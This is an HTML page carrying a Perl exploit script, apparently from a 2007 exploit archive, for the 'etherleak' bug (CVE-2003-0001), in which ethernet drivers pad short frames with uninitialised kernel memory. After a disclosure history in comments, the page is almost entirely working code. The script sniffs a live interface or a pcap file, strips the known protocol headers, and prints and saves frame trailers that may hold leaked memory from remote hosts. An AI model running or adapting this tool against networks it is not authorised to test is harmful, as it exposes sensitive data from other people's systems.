<html><head><title>Ethernet Device Drivers Frame Padding Info Leakage Exploit (Etherleak)</title></head><pre>#!/usr/bin/perl -w
# etherleak, code that has been 5 years coming.
#
# On 04/27/2002, I disclosed on the Linux Kernel Mailing list,
# a vulnerability that would be come known as the 'etherleak' bug.  In
# various situations an ethernet frame must be padded to reach a specific
# size or fall on a certain boundary.  This task is left up to the driver
# for the ethernet device.  The RFCs state that this padding must consist
# of NULLs.  The bug is that at the time and still to this day, many device
# drivers do not pad will NULLs, but rather pad with unsanitized portions
# of kernel memory, oftentimes exposing sensitive information to remote
# systems or those savvy enough to coerce their targets to do so.
#
# Proof of this can be found by googling for 'warchild and etherleak', or
# by visiting:
#
#  http://lkml.org/lkml/2002/4/27/101
#
# This was ultimately fixed in the Linux kernel, but over time this
# vulnerability reared its head numerous times, but at the core the
# vulnerability was the same as the one I originally published.  The most
# public of these was CVE-2003-0001, which was assigned to address an
# official @stake advisory.
#
# This code can be found its most current form at:
#  
#  http://spoofed.org/files/exploits/etherleak
#
# Jon Hart &lt;jhart@spoofed.org&gt;, March 2007
#

use strict;
use diagnostics;
use warnings;
use Getopt::Long;
use Net::Pcap;
use NetPacket::Ethernet qw(:ALL);
use NetPacket::IP qw(:ALL);

my %opts = ();
my ($iface, $err, $pcap_t, $pcap_save, $filter_string); 

GetOptions( \%opts, 'help', 'filter=s', 'interface=s', 'quiet', 'read=s', 'write=s', 'verbose') or
            die &quot;Unknown option: $!\n&quot; &amp;&amp; &amp;usage();

if (defined($opts{'help'})) {
   &amp;usage();
   exit(0);
}

if (defined($opts{'read'})) {
   $pcap_t = Net::Pcap::open_offline($opts{'read'}, \$err);
   if (!defined($pcap_t)) {
      print(&quot;Net::Pcap::open_offline failed: $err\n&quot;);
      exit 1;
   }
} else {
   if (defined($opts{'interface'})) {
      $iface = $opts{'interface'};
   } else {
      $iface = Net::Pcap::lookupdev(\$err);
      if (defined($err)) {
         print(STDERR &quot;lookupdev() failed: $err\n&quot;);
         exit(1);
      } else {
         print(STDERR &quot;No interface specified.  Using $iface\n&quot;);
      }
   }

   $pcap_t = Net::Pcap::open_live($iface, 65535, 1, 0, \$err);
   if (!defined($pcap_t)) {
      print(&quot;Net::Pcap::open_live failed on $iface: $err\n&quot;);
      exit 1;
   }
}

my $filter;
if (Net::Pcap::compile($pcap_t, \$filter, defined($opts{'filter'}) ? $opts{'filter'} : &quot;&quot;, 0, 0) == -1) {
   printf(&quot;Net::Pcap::compile failed: %s\n&quot;, Net::Pcap::geterr($pcap_t));
   exit(1);
}

if (Net::Pcap::setfilter($pcap_t, $filter) == -1) {
   printf(&quot;Net::Pcap::setfilter failed: %s\n&quot;, Net::Pcap::geterr($pcap_t));
   exit(1);
}

if (defined($opts{'write'})) {
   $pcap_save = Net::Pcap::dump_open($pcap_t, $opts{'write'});
   if (!defined($pcap_save)) {
      printf(&quot;Net::Pcap::dump_open failed: %s\n&quot;, Net::Pcap::geterr($pcap_t));
      exit(1);
   }
}

Net::Pcap::loop($pcap_t, -1, \&amp;process, &quot;foo&quot;);
Net::Pcap::close($pcap_t);

if (defined($opts{'write'})) {
   Net::Pcap::dump_close($pcap_save);
}



sub process {
   my ($user, $hdr, $pkt) = @_;
   my ($link, $ip);
   my $jump = 0;

   my $datalink = Net::Pcap::datalink($pcap_t);
   if    ($datalink == 1) { $jump += 14; }
   elsif ($datalink == 113) { $jump += 16; }
   else { printf(&quot;Skipping datalink $datalink\n&quot;); return; }

   my $l2 = NetPacket::Ethernet-&gt;decode($pkt);
   
   if ($l2-&gt;{type} == ETH_TYPE_IP) {
      $ip = NetPacket::IP-&gt;decode(eth_strip($pkt));
      $jump += $ip-&gt;{len};
   } elsif ($l2-&gt;{type} == ETH_TYPE_ARP) { $jump += 28; }
   else { 
      # assume 802.3 ethernet, and just jump ahead the length
      for ($l2-&gt;{dest_mac}) {
         if (/^0180c200/) {
            # spanning tree
            # l2-&gt;{type} here will actually be the length.  HACK.
            $jump += $l2-&gt;{type};
         }
         elsif (/^01000ccccc/) {
            # CDP/VTP/DTP/PAgP/UDLD/PVST, etc
            # l2-&gt;{type} here will actually be the length.  HACK.
            $jump += $l2-&gt;{type};
         } elsif (/^ab0000020000/) {
            # DEC-MOP-Remote-Console
            return;
         } else {
            # loopback
            if ($l2-&gt;{src_mac} eq $l2-&gt;{dest_mac}) { return; }
            printf(&quot;Skipping datalink $datalink l2 type %s\n&quot;, $l2-&gt;{type}); return;
         }
      }
   }


   if ($hdr-&gt;{len} &gt; $jump) {
      my $trailer_bin = substr($pkt, $jump);
      my $trailer_hex = &quot;&quot;;
      my $trailer_ascii = &quot;&quot;;
      foreach (split(//, $trailer_bin)) {
         $trailer_hex .= sprintf(&quot;%02x&quot;, ord($_));
         if (ord($_) &gt;= 32 &amp;&amp; ord($_) &lt;= 126) {
            $trailer_ascii .= $_;
         } else { $trailer_ascii .= &quot;.&quot;; }
      }
      # ignore all trailers that are just single characters repeated.
      # most OS' use 0, F, 5 or a.
      unless ($trailer_hex =~ /^(0|5|f|a)\1*$/i) {
         unless ($opts{'quiet'}) {
            print(&quot;#&quot;x80, &quot;\n&quot;);
            printf(&quot;%s -&gt; %s\n&quot;, $l2-&gt;{src_mac}, $l2-&gt;{dest_mac});
            if ($l2-&gt;{type} == ETH_TYPE_IP) {
               printf(&quot;%s -&gt; %s\n&quot;, $ip-&gt;{src_ip}, $ip-&gt;{dest_ip});
            }
         }
         print(&quot;$trailer_hex\t$trailer_ascii\n&quot;);
         if (defined($opts{'write'})) {
            Net::Pcap::dump($pcap_save, $hdr, $pkt);
         }
      }
   }
}

sub usage {
   print &lt;&lt;EOF;
$0 -- A demonstration of the infamous 'etherleak' bug.

   CVE-2003-0001, and countless repeats of the same vulnerability.

   Options:
   [-h|--help]                  # this message
   [-i|--interface] &lt;interface&gt; # interface to listen on
   [-f|--filter] &lt;pcap filter&gt;  # apply this filter to the traffic
   [-r|--read] &lt;path to pcap&gt;   # read from this saved pcap file
   [-w|--write] &lt;path to pcap&gt;  # write tothis saved pcap file
   [-q|--quiet]                 # be quiet
   [-v|--verbose]               # be verbose

EOF


}

# milw0rm.com [2007-03-23]</pre></html>